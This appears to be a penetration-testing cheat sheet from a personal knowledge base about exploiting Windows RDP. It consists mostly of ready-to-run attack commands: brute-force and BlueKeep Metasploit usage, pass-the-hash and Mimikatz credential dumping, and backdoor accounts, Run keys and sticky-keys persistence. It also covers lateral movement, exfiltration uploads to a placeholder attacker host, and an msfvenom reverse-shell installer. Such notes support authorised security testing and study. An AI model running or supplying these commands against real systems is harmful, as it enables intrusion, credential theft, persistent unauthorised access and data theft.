---
id: Exploitation
aliases: []
tags:
  - Networking/Services/RDP/Exploitation
links:
  [[Services]]
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Common Issues {{{-->
## Common Issues

> [!info]-
>
> | Issue                | Description                              | Exploitation         |
> | -------------------- | ---------------------------------------- | -------------------- |
> | No NLA               | Network Level Authentication disabled    | Easier brute force   |
> | Weak encryption      | Low encryption settings                  | MITM possible        |
> | No account lockout   | Unlimited login attempts                 | Brute force friendly |
> | Certificate warnings | Self-signed or invalid cert              | MITM attacks         |
> | Clipboard enabled    | Clipboard sharing on                     | Data exfiltration    |
> | Drive sharing        | Local drives shared                      | File transfer        |

___

<!-- }}} -->

<!-- Credentials {{{-->
## Credentials

<!-- Default Credentials {{{-->
### Default Credentials

[[Usage#Connect|Connect]] using common credentials

> [!info]- Default Credentials
>
> ```sh
> Administrator:<blank>
> Administrator:admin
> Administrator:password
> Administrator:Password123
> admin:admin
> user:user
> ```

<!-- }}} -->

<!-- Brute Forcing {{{-->
### Brute Forcing

Brute forcing RDP credentials requires specialized tools
due to the protocol's complexity

> [!tip]- Wordlists
>
> Passwords
>
> ```
> /usr/share/wordlists/rockyou.txt
> ```
>
> Usernames
>
> ```
> /usr/share/wordlists/seclists/Usernames/Names/names.txt
> ```


[[Crowbar]]

```sh
crowbar -b rdp -s <target>/32 -u <username> -C <passwords.txt>
```

[[Ncrack]]

```sh
ncrack -vv --user <username> -P <passwords.txt> rdp://<target>
```

[[Hydra]]

```sh
hydra -t 1 -V -f -l <username> -P <passwords.txt> rdp://<target>
```

[[Metasploit]]

```sh
use auxiliary/scanner/rdp/rdp_scanner
```

> [!example]-
>
> ```sh
> use auxiliary/scanner/rdp/rdp_scanner
> ```
> ```sh
> set RHOSTS <target>
> ```
> ```sh
> run
> ```


<!-- }}} -->

___
<!-- }}} -->

<!-- BlueKeep {{{-->
## BlueKeep

Detect and exploit BlueKeep
(*[CVE-2019-0708](https://nvd.nist.gov/vuln/detail/cve-2019-0708)*)
for remote code execution

> [!info]-
>
> Affects
>
> - Windows 7 and Server 2008
> - XP, Server 2003
>
> Metasploit supported targets
>
> - Windows 7 SP1
> - Windows Server 2008 R2

[[Metasploit]] — CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
(*[cve_2019_0708_bluekeep](https://www.rapid7.com/db/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep/)*)

```sh
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

> [!example]-
>
> ```sh
> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
> set RHOSTS <target>
> run
> ```

[[Metasploit]] — CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
(*[cve_2019_0708_bluekeep_rce](https://www.rapid7.com/db/modules/exploit/windows/rdp/cve_2019_0708_bluekeep_rce/)*)

```sh
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

> [!example]-
>
> ```sh
> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
> set RHOSTS <target>
> set TARGET 2
> exploit
> ```
>
> - `set TARGET 2`: Windows 7 x64

___
<!-- }}} -->

<!-- Pass-the-Hash {{{-->
## Pass-the-Hash

Use NTLM hashes to authenticate to RDP without knowing plaintext passwords

Using [xfreerdp](https://linux.die.net/man/1/xfreerdp)

```sh
xfreerdp /u:<administrator> /pth:<NTHASH> /v:<target> /cert:ignore
```

> [!info]-
>
> - `<NTHASH>`: NTLM hash for the administrator account

Using [[Mimikatz]] (*from a compromised machine*)

```sh
sekurlsa::pth /user:<administrator> /domain:<DOMAIN> /ntlm:HASH /run:"mstsc /v:<target>"
```

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Credential Harvesting {{{-->
## Credential Harvesting

Extract credentials and authentication data from compromised RDP systems

[[Mimikatz]] —
Read credentials from LSASS memory for currently logged-on sessions

```sh
sekurlsa::logonpasswords
```

<!-- Example {{{-->
> [!example]-
>
>
> ```sh
> mimikatz.exe
> ```
> ```sh
> privilege::debug
> ```
> ```sh
> sekurlsa::logonpasswords
> ```
<!-- }}} -->

[[Mimikatz]] — Extract cached domain login entries Windows keeps

```sh
lsadump::cache
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> mimikatz.exe
> ```
> ```sh
> privilege::debug
> ```
> ```sh
> lsadump::cache
> ```
<!-- }}} -->

Dump [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager)
registry hives

<!-- Example {{{-->
> [!example]-
>
> `HKLM\SAM` hive contains local account password hashes
>
> ```sh
> reg save HKLM\SAM C:\Windows\Temp\sam
> ```
>
> `HKLM\SYSTEM` contains boot keys used to decrypt password hashes
>
> ```sh
> reg save HKLM\SYSTEM C:\Windows\Temp\system
> ```
>
> `HKLM\SECURITY` contains [LSA](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
> secrets which can contain service-accounts secrets, cached/secret credentials
> and keys an attacker can extract offline
>
> ```sh
> reg save HKLM\SECURITY C:\Windows\Temp\security
> ```
<!-- }}} -->

[[Impacket]] - [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
— Extract hashes

```sh
impacket-secretsdump -sam sam -system system LOCAL
```

___
<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Create persistent backdoor access to compromised RDP systems

Create backdoor user

> [!example]-
>
> 1. Create new user
>
> ```sh
> net user <user> <password> /add
> ```
>
> 2. Add user to `administrators` group
>
> ```sh
> net localgroup administrators <user> /add
> ```
>
> 3. Add user to `Remote Desktop Users` group
>
> ```sh
> net localgroup "Remote Desktop Users" <user> /add
> ```

Registry Run key

> [!example]-
>
> Automatically launch `backdoor.exe` when that user logs in
>
> ```sh
> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
> ```

Scheduled task

> [!example]-
>
> Run `backdoor.exe` at logon with `SYSTEM` privileges
>
> ```sh
> schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM
> ```

Sticky keys backdoor (persistent)

> [!example]-
>
> ```sh
> copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
> ```
>
> ```sh
> copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
> ```

___
<!-- }}} -->

<!-- Lateral Movement {{{-->
## Lateral Movement

Move across the network laterally from compromised RDP systems

RDP to other machines

```sh
mstsc /v:<target>
```

Pass-the-Hash to other systems

```sh
xfreerdp /u:<user> /pth:<HASH> /v:<target>
```

Use PSExec with captured credentials

```sh
psexec \\<target> -u <user> -p <password> cmd
```

WMI lateral movement

```sh
wmic /node:<target> /user:<user> /password:<password> process call create "cmd.exe"
```

___

<!-- }}} -->

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Extract sensitive data from compromised RDP systems

Compress sensitive user data

> [!example]-
>
> ```sh
> Compress-Archive -Path <C:\Users\> -DestinationPath C:\Temp\exfil.zip
> ```

Transfer via shared drive (*if RDP was connected with `/drives` option*)

> [!example]-
>
> ```sh
> copy <C:\sensitive\data.txt> <\\tsclient\c\exfil\>
> ```

Upload to attacker server

> [!example]-
>
> ```sh
> Invoke-WebRequest -Uri http://<attacker.com/upload> -Method POST -InFile <C:\Temp\data.zip>
> ```

Base64 encode and exfiltrate

> [!example]-
>
> ```sh
> $data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<C:\Temp\data.zip>"))
> ```
> ```sh
> Invoke-WebRequest -Uri http://<attacker.com/path> -Method POST -Body $data
> ```

> [!tip]-
>
> - Transfer via RDP clipboard (if enabled)
> - Copy file in RDP session, paste on local machine
___
<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Escalate privileges on compromised RDP systems

Check privileges

> [!example]-
>
> ```sh
> whoami /all
> ```
> ```sh
> whoami /priv
> ```

Check for unquoted service paths

> [!info]-
>
> Windows can interpret unquoted service path components loosely,
> letting local attacker place a malicious executable
> in a higher-priority folder to run with service's privileges
> (*often `SYSTEM`*)


> [!example]-
>
> ```sh
> wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v """
> ```

AlwaysInstallElevated check

> [!info]-
>
> Check whether the `AlwaysInstallElevated` policy is enabled
> for machine (`HKLM`) and user (`HKCU`) —
> if both are set to `1`, non-elevated MSI installs
> can run with `SYSTEM` privileges

> [!example]-
>
> ```sh
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> ```
> ```sh
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> ```

Exploit (*if enabled*)

> [!example]-
>
> 1. Build a malicious installer with [[msfvenom]]
>
> ```sh
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f msi > installer.msi
> ```
>
> 2. Install silently
>
> ```sh
> msiexec /quiet /qn /i installer.msi
> ```

___
<!-- }}} -->

<!-- }}} -->
